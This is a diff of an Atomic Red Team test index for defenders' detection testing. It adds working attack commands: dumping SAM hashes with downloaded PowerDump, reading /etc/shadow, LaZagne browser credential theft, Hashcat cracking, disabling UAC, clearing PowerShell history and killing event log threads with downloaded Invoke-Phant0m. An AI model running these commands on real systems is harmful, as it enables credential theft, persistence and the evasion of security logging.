+      auto_generated_guid: 4c8db261-a58b-42a6-a866-0a294deedde4
+      description: 'Running Chrome VPN Extensions via the Registry install 2 vpn extension,
+        please see "T1133\src\list of vpn extension.txt" to view complete list
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        chrome_url:
+          description: chrome installer download URL
+          type: url
+          default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe
+        extension_id:
+          description: chrome extension id
+          type: String
+          default: '"fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
+
+'
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'chrome must be installed
+
+'
+        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
+          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $extList = #{extension_id}
+          foreach ($extension in $extList) {
+            New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
+            New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
+          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start-Sleep -Seconds 30
+          Stop-Process -Name "chrome"
+        cleanup_command: |-
+          $extList = #{extension_id}
+          foreach ($extension in $extList) {
+          Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
   T1574:
     technique:
       external_references:
@@ -13141,7 +13550,30 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.002
+    atomic_tests:
+    - name: Office Apllication Startup Test Persistence
+      auto_generated_guid: c3e35b58-fe1c-480b-b540-7600fb612563
+      description: |
+        Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
+        application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.
+      supported_platforms:
+      - windows
+      input_arguments:
+        thing_to_execute:
+          description: Thing to Run
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"
+          /t REG_SZ /d "#{thing_to_execute}"
+
+'
+        cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office
+          test\Special\Perf"
+
+'
+        name: command_prompt
   T1137.003:
     technique:
       external_references:
@@ -13604,11 +14036,11 @@ persistence:
           sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto
           sc start "Example Service"
         cleanup_command: |
-          sc stop "Example Service"
-          sc delete "Example Service"
-          del "C:\Program Files\windows_service.exe"
-          del "C:\program.exe"
-          del "C:\Time.log"
+          sc stop "Example Service" >nul 2>&1
+          sc delete "Example Service" >nul 2>&1
+          del "C:\Program Files\windows_service.exe" >nul 2>&1
+          del "C:\program.exe" >nul 2>&1
+          del "C:\Time.log" >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1547.011:
@@ -14366,6 +14798,7 @@ persistence:
 
 '
         name: command_prompt
+        elevation_required: true
     - name: PowerShell Registry RunOnce
       auto_generated_guid: eb44f842-0457-4ddc-9b92-c4caa144ac42
       description: |
@@ -14577,7 +15010,27 @@ persistence:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1098.004
+    atomic_tests:
+    - name: Modify SSH Authorized Keys
+      auto_generated_guid: 342cc723-127c-4d3a-8292-9c0c6b4ecadc
+      description: "Modify contents of <user-home>/.ssh/authorized_keys to maintain
+        persistence on victim host. \nIf the user is able to save the same contents
+        in the authorized_keys file, it shows user can modify the file.\n"
+      supported_platforms:
+      - macos
+      - linux
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat
+          ~/.ssh/authorized_keys); echo $ssh_authorized_keys > ~/.ssh/authorized_keys;
+          fi;
+
+'
+        cleanup_command: 'unset ssh_authorized_keys
+
+'
   T1053.005:
     technique:
       external_references:
@@ -15085,59 +15538,7 @@ persistence:
         techniques. "
       x_mitre_platforms:
       - Windows
-      identifier: T1574.010
-    atomic_tests:
-    - name: File System Permissions Weakness
-      auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
-      description: |
-        This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
-        powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
-        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
-
-        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
-      supported_platforms:
-      - windows
-      input_arguments:
-        malicious_file:
-          description: File to replace weak permission file with
-          type: path
-          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
-        weak_permission_file:
-          description: check weak files permission
-          type: path
-          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
-
-'
-        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: |
-          New-Item #{weak_permission_file} -Force | Out-Null
-          Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: 'A file to replace the original weak_permission_file. In an attack
-          this would be the malicious file gaining extra privileges
-
-'
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
-          New-Item #{malicious_file} -Force | Out-Null
-          Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
-      executor:
-        command: |
-          Get-WmiObject win32_service | select PathName
-          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
-        cleanup_command: |
-          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
-          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
-        name: powershell
+    atomic_tests: []
   T1574.011:
     technique:
       external_references:
@@ -15227,9 +15628,9 @@ persistence:
     atomic_tests:
     - name: Service Registry Permissions Weakness
       auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
-      description: "Service registry permissions weakness check and then which can
-        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
-        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      description: |
+        Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.
+        reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /v ImagePath /d "C:\temp\AtomicRedteam.exe"
       supported_platforms:
       - windows
       input_arguments:
@@ -15242,6 +15643,48 @@ persistence:
           get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
           get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
         name: powershell
+    - name: Service ImagePath Change with reg.exe
+      auto_generated_guid: f38e9eea-e1d7-4ba6-b716-584791963827
+      description: 'Change Service registry ImagePath of a bengin service to a malicious
+        file
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service name
+          type: String
+          default: calcservice
+        weak_service_path:
+          description: weak service path
+          type: String
+          default: "%windir%\\system32\\win32calc.exe"
+        malicious_service_path:
+          description: malicious service path
+          type: String
+          default: "%windir%\\system32\\cmd.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The service must exist (#{weak_service_name})
+
+'
+        prereq_command: 'if (Get-Service #{weak_service_name}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'sc.exe create #{weak_service_name} binpath= "#{weak_service_path}"
+
+'
+      executor:
+        command: 'reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
+          /f /v ImagePath /d "#{malicious_service_path}"
+
+'
+        cleanup_command: 'sc.exe delete #{weak_service_name}
+
+'
+        name: command_prompt
   T1547.009:
     technique:
       external_references:
@@ -16599,7 +17042,45 @@ credential-access:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Linux
-    atomic_tests: []
+      identifier: T1003.008
+    atomic_tests:
+    - name: Access /etc/shadow (Local)
+      auto_generated_guid: 3723ab77-c546-403c-8fb4-bb577033b235
+      description: "/etc/shadow file is accessed in Linux environments\n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "/tmp/T1003.008.txt"
+      executor:
+        command: |
+          sudo cat /etc/shadow > #{output_file}
+          cat #{output_file}
+        cleanup_command: 'rm -f #{output_file}
+
+'
+        name: bash
+        elevation_required: true
+    - name: Access /etc/passwd (Local)
+      auto_generated_guid: 60e860b6-8ae6-49db-ad07-5e73edd88f5d
+      description: "/etc/passwd file is accessed in Linux environments\n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "/tmp/T1003.008.txt"
+      executor:
+        command: |
+          cat /etc/passwd > #{output_file}
+          cat #{output_file}
+        cleanup_command: 'rm -f #{output_file}
+
+'
+        name: sh
   T1552.003:
     technique:
       external_references:
@@ -17353,6 +17834,34 @@ credential-access:
           cd ~/Library/Cookies
           grep -q "#{search_string}" "Cookies.binarycookies"
         name: sh
+    - name: LaZagne - Credentials from Browser
+      auto_generated_guid: 9a2915b3-3954-4cce-8c76-00fbf4dbd014
+      description: "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne)
+        to extract passwords from browsers on the Windows operating system.\nLaZagne
+        is an open source application used to retrieve passwords stored on a local
+        computer. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        lazagne_path:
+          description: Path to LaZagne
+          type: Path
+          default: PathToAtomicsFolder\T1555.003\bin\LaZagne.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'LaZagne.exe must exist on disk at specified location (#{lazagne_path})
+
+'
+        prereq_command: 'if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{lazagne_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "#{lazagne_path}"
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "#{lazagne_path} browsers\n"
   T1552.002:
     technique:
       external_references:
@@ -19063,7 +19572,7 @@ credential-access:
       - Ed Williams, Trustwave, SpiderLabs
       identifier: T1003.003
     atomic_tests:
-    - name: Create Volume Shadow Copy with NTDS.dit
+    - name: Create Volume Shadow Copy with vssadmin
       auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
       description: |
         This test is intended to be run on a domain Controller.
@@ -19101,7 +19610,7 @@ credential-access:
 
         The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
 
-        This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+        This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
         A successful test also requires the export of the SYSTEM Registry hive.
         This test must be executed on a Windows Domain Controller.
       supported_platforms:
@@ -19134,7 +19643,7 @@ credential-access:
 
 '
         get_prereq_command: 'echo Run "Invoke-AtomicTest T1003.003 -TestName ''Create
-          Volume Shadow Copy with NTDS.dit''" to fulfuill this requirement
+          Volume Shadow Copy with vassadmin''" to fulfuill this requirement
 
 '
       - description: 'Extract path must exist
@@ -19704,7 +20213,50 @@ credential-access:
       - Windows
       - Office 365
       - Azure AD
-    atomic_tests: []
+      identifier: T1110.002
+    atomic_tests:
+    - name: Password Cracking with Hashcat
+      auto_generated_guid: 6d27df5d-69d4-4c91-bc33-5983ffe91692
+      description: Execute Hashcat.exe with provided SAM file from registry of Windows
+        and Password list to crack against
+      supported_platforms:
+      - windows
+      input_arguments:
+        hashcat_exe:
+          description: Path to Hashcat executable
+          type: String
+          default: "%temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe"
+        input_file_sam:
+          description: Path to SAM file
+          type: string
+          default: PathToAtomicsFolder\T1110.002\src\sam.txt
+        input_file_passwords:
+          description: Path to password list
+          type: string
+          default: PathToAtomicsFolder\T1110.002\src\password.lst
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Hashcat must exist on disk at specified location (#{hashcat_exe})
+        prereq_command: 'if (Test-Path  $(cmd /c echo #{hashcat_exe})) {exit 0} else
+          {exit 1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "$env:TEMP\7z1900.exe"
+          Start-Process -FilePath "$env:Temp\7z1900.exe" -ArgumentList "/S /D=$env:temp\7zi" -NoNewWindow
+          Invoke-WebRequest "https://hashcat.net/files/hashcat-6.1.1.7z" -OutFile "$env:TEMP\hashcat6.7z"
+          Start-Process cmd.exe -Args  "/c %temp%\7z\7z.exe x %temp%\hashcat6.7z -aoa -o%temp%\hashcat-unzip" -Wait
+          New-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null
+          Move-Item $env:Temp\hashcat-unzip\hashcat-6.1.1\* $(cmd /c echo #{hashcat_exe}\..) -Force -ErrorAction Ignore
+      executor:
+        command: |-
+          cd #{hashcat_exe}\..
+          #{hashcat_exe} -a 0 -m 1000 -r .\rules\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}
+        cleanup_command: |-
+          del %temp%\hashcat6.7z >nul 2>&1
+          del %temp%\7z1900.exe >nul 2>&1
+          del %temp%\7z /Q /S >nul 2>&1
+          del %temp%\hashcat-unzip /Q /S >nul 2>&1
+        name: command_prompt
+        elevation_required: true
   T1556.002:
     technique:
       external_references:
@@ -20435,14 +20987,14 @@ credential-access:
         copy_dest:
           description: Destination of the copied file
           type: String
-          default: "%windir%"
+          default: "%temp%"
       executor:
-        command: 'del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path}
-          /d #{copy_dest}/#{file_name}
+        command: 'esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
 
 '
         name: command_prompt
         elevation_required: true
+        cleanup_command: del
     - name: PowerDump Registry dump of SAM for hashes and usernames
       auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
       description: Executes a hashdump by reading the hasshes from the registry.
@@ -20452,7 +21004,7 @@ credential-access:
         command: |-
           Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
           Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
-          Invoke-Webrequest -Uri "https://github.com/BC-SECURITY/Empire/blob/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
+          Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
           Import-Module .\PowerDump.ps1
           Invoke-PowerDump
         name: powershell
@@ -21441,8 +21993,10 @@ defense-evasion:
     - name: Persist, Download, & Execute
       auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
       description: |
-        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
-        and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+        Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+        This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+        This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
       supported_platforms:
       - windows
       input_arguments:
@@ -21505,7 +22059,7 @@ defense-evasion:
           /eventName:desktopimgdownldr
 
 '
-        cleanup_command: 'del #{cleanup_path}\#{cleanup_file}
+        cleanup_command: 'del #{cleanup_path}\#{cleanup_file} >null 2>&1
 
 '
         name: command_prompt
@@ -21897,10 +22451,11 @@ defense-evasion:
         elevation_required: true
     - name: Bypass UAC using sdclt DelegateExecute
       auto_generated_guid: 3be891eb-4608-4173-87e8-78b494c029b7
-      description: "Bypasses User Account Control using a fileless method, registry
-        only. \nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference
-        - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted
-        from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n"
+      description: |
+        Bypasses User Account Control using a fileless method, registry only.
+        Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
+        [Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
+        Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)
       supported_platforms:
       - windows
       input_arguments:
@@ -21919,6 +22474,24 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Disable UAC using reg.exe
+      auto_generated_guid: 9e8af564-53ec-407e-aaa8-3cb20c3af7f9
+      description: |
+        Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key
+        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA from 1 to 0
+      supported_platforms:
+      - windows
+      executor:
+        command: 'reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v EnableLUA /t REG_DWORD /d 0 /f
+
+'
+        cleanup_command: 'reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v EnableLUA /t REG_DWORD /d 1 /f
+
+'
+        name: command_prompt
+        elevation_required: true
   T1218.003:
     technique:
       external_references:
@@ -22409,6 +22982,31 @@ defense-evasion:
           hostname
           whoami
         name: sh
+    - name: Prevent Powershell History Logging
+      auto_generated_guid: 2f898b81-3e97-4abb-bc3f-a95138988370
+      description: 'Prevents Powershell history
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'Set-PSReadlineOption –HistorySaveStyle SaveNothing
+
+'
+        name: powershell
+        cleanup_command: Set-PSReadLineOption -HistorySaveStyle SaveIncrementally
+    - name: Clear Powershell History by Deleting History File
+      auto_generated_guid: da75ae8d-26d6-4483-b0fe-700e4df4f037
+      description: 'Clears Powershell history
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+'
+        name: powershell
   T1070.002:
     technique:
       external_references:
@@ -22955,6 +23553,174 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Invoke CHM with default Shortcut Command Execution
+      auto_generated_guid: 29d6f0d7-be63-4482-8827-ea77126c1ef7
+      description: Executes a CHM file with the default Shortcut Command method.
+      supported_platforms:
+      - windows
+      input_arguments:
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath
+          #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM with InfoTech Storage Protocol Handler
+      auto_generated_guid: b4094750-5fc7-4e8e-af12-b4e36bf5e7f6
+      description: Executes a CHM file with the ITS protocol handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler}
+          -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM Simulate Double click
+      auto_generated_guid: 5decef42-92b8-4a93-9eb2-877ddcb9401a
+      description: Executes a CHM file simulating a user double click.
+      supported_platforms:
+      - windows
+      input_arguments:
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM with Script Engine and Help Topic
+      auto_generated_guid: 4f83adda-f5ec-406d-b318-9773c9ca92e5
+      description: Executes a CHM file with a defined script engine, ITS Protocol
+        Handler, and help topic extension.
+      supported_platforms:
+      - windows
+      input_arguments:
+        topic_extension:
+          description: Default Help Topic
+          type: string
+          default: html
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        script_engine:
+          description: Default Script Engine
+          type: string
+          default: JScript
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler
+          #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath
+          #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM Shortcut Command with ITS and Help Topic
+      auto_generated_guid: 15756147-7470-4a83-87fb-bb5662526247
+      description: Executes a CHM file using the Shortcut Command method with a defined
+        ITS Protocol Handler, and help topic extension.
+      supported_platforms:
+      - windows
+      input_arguments:
+        topic_extension:
+          description: Default Help Topic
+          type: string
+          default: html
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler
+          #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath
+          #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
   T1542.002:
     technique:
       external_references:
@@ -23535,11 +24301,11 @@ defense-evasion:
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no
-          net localgroup administrators guest /delete
-          net localgroup "Remote Desktop Users" guest /delete
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f
-          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f
+          net user guest /active:no >nul 2>&1
+          net localgroup administrators guest /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
+          reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1578.003:
@@ -23745,7 +24511,36 @@ defense-evasion:
       x_mitre_data_sources:
       - API monitoring
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1006
+    atomic_tests:
+    - name: Read volume boot sector via DOS device path (PowerShell)
+      auto_generated_guid: 88f6327e-51ec-4bbf-b2e8-3fea534eab8b
+      description: |-
+        This test uses PowerShell to open a handle on the drive volume via the `\\.\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.
+        On success, a hex dump of the first 11 bytes of the volume is displayed.
+
+        For a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):
+        ```
+                   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+        00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS
+        ```
+      supported_platforms:
+      - windows
+      input_arguments:
+        volume:
+          description: Drive letter of the volume to access
+          type: string
+          default: 'C:'
+      executor:
+        command: |
+          $buffer = New-Object byte[] 11
+          $handle = New-Object IO.FileStream "\\.\#{volume}", 'Open', 'Read', 'ReadWrite'
+          $handle.Read($buffer, 0, $buffer.Length)
+          $handle.Close()
+          Format-Hex -InputObject $buffer
+        name: powershell
+        elevation_required: true
   T1562.002:
     technique:
       external_references:
@@ -23809,6 +24604,26 @@ defense-evasion:
             C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false *>$null
           }
         name: powershell
+    - name: Kill Event Log Service Threads
+      auto_generated_guid: 41ac52ba-5d5e-40c0-b267-573ed90489bd
+      description: Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING
+        you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+          $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+          $output = "$env:TEMP\Invoke-Phant0m.ps1"
+          $wc = New-Object System.Net.WebClient
+          $wc.DownloadFile($url, $output)
+          cd $env:TEMP
+          Import-Module .\Invoke-Phant0m.ps1
+          Invoke-Phant0m
+        cleanup_command: Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS"
+          -fore red
+        name: powershell
+        elevation_required: true
   T1562.007:
     technique:
       external_references:
@@ -23980,7 +24795,37 @@ defense-evasion:
         command: netsh advfirewall firewall add rule name="Open Port to Any" dir=in
           protocol=tcp localport=#{local_port} action=allow profile=any
         cleanup_command: netsh advfirewall firewall delete rule name="Open Port to
-          Any"
+          Any" | Out-Null
+        name: powershell
+        elevation_required: true
+    - name: Allow Executable Through Firewall Located in Non-Standard Location
+      auto_generated_guid: 6f5822d2-d38d-4f48-9bfc-916607ff6b8c
